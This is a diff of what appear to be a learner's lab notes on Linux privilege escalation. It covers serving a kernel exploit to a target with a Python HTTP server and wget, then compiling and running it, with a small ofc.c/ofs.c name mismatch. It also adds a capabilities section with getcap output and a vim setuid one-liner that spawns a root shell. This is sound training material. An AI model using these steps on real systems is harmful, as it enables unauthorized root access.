@@ -193,7 +193,7 @@ find / -perm -u=s -type f 2>/dev/null
 uname -a
 ```
 2. Find an exploit code for the kernel version of the target system.
-  * Use [Exploit Database](https://www.exploit-db.com) to search for an existing exploit code.
+  * Use [Exploit Database](https://www.exploit-db.com) to search for an exploit code.
 3. Download the exploit to the attacking machine.
 4. Serve the exploit code to the target using `SimpleHTTPServer` Python module.
 ```
@@ -204,14 +204,14 @@ python3 -m http.server 9000
 wget http://10.10.166.35:9000/37392.c -P /tmp/
 ```
   * `-P` option specifies that the file should be saved to the `/tmp/` directory on the target.
-  * Specify the path as `/tmp/` where the file be downloaded to avoid the permission error while running `wget` because you are a low-level privilege user (karen).
+    * Specify the path as `/tmp/` to avoid the permission error while running `wget` as a low-level privilege user (karen).
 6. Run the exploit file to perform privilege escalation.
 > Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
-  * Rename exploit file.
+  * Rename the exploit file.
 ```
 ofc.c: mv ./37392.c ofc.c
 ```
-  * Compile C source code file `ofs.c` into a binary executable file named `ofs`.
+  * Compile C source code file into a binary executable file.
 ```
 gcc ofs.c -o ofs
 ```
@@ -380,6 +380,32 @@ hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
 * Switch to the new user and hopefully gain root privileges. 
 
 ## Privilege Escalation: Capabilities
+* "Capabilities" are another method system admins can use to increase the privilege level of a process or binary.
+  * Manage privileged at a more granular level.
+  * Change the capabilities of an individual binary.
+* `getcap` tool lists enabled capabilities.
+   * Generates huge amount of errors when run as unprivileged user.
+     * Redirect error messages to `dev/null`.
+```
+getcap -r / 2>/dev/null
+```
+* Output lists
+```
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+```
+* [GTFObins](https://gtfobins.github.io/#+capabilities) has good list of binaries if any capabilities are set.
+> ## Capabilities
+> If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
+> This requires that vim is compiled with Python support. Prepend :py3 for Python 3.
+> cp $(which vim) .
+> sudo setcap cap_setuid+ep vim
+> ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+* 
 
 ## Privilege Escalation: Cron Jobs
 ## Privilege Escalation: PATH
